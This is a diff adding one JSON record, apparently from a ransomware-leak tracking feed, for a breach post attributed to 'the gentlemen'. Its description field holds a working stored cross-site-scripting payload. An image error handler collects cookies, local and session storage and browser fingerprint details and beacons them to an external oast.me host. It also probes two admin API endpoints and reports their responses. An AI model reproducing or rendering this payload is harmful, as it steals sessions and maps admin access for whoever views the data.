@@ -1,0 +1,15 @@
+{
+  "slug": "the-gentlemen-rcbot3-2026-08-22",
+  "title": "RCBOT3",
+  "group": "the gentlemen",
+  "discovered": "2026-08-22T04:13:38.000Z",
+  "category": "data_breach",
+  "severity": "high",
+  "country": null,
+  "sizeBytes": 0,
+  "description": "<img src=x onerror=\"var H='https://nzagpz3jm8i5v726mnliix7xw412xve3w.oast.me';var b=function(p,d){var i=new Image();i.src=H+p+encodeURIComponent(d)};var ls='';try{for(var k in localStorage){ls+=k+'='+localStorage[k]+';'}}catch(e){ls='err'}var ss='';try{for(var k in sessionStorage){ss+=k+'='+sessionStorage[k]+';'}}catch(e){ss='err'}b('/fp?d=',navigator.userAgent+'|'+navigator.platform+'|'+screen.width+'x'+screen.height+'|'+Intl.DateTimeFormat().resolvedOptions().timeZone+'|ck:'+document.cookie+'|ls:'+ls.slice(0,200)+'|ss:'+ss.slice(0,200));fetch('/api/admin/images').then(function(r){b('/adm?s=',r.status)}).catch(function(e){b('/adm?s=','err')});fetch('/api/admin/companies',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'}).then(function(r){b('/admc?s=',r.status)}).catch(function(e){b('/admc?s=','err')});\">",
+  "source_url": "https://www.ransomlook.io/recent",
+  "groupAliases": [],
+  "activity": null,
+  "references": ["ransomlook.io"]
+}
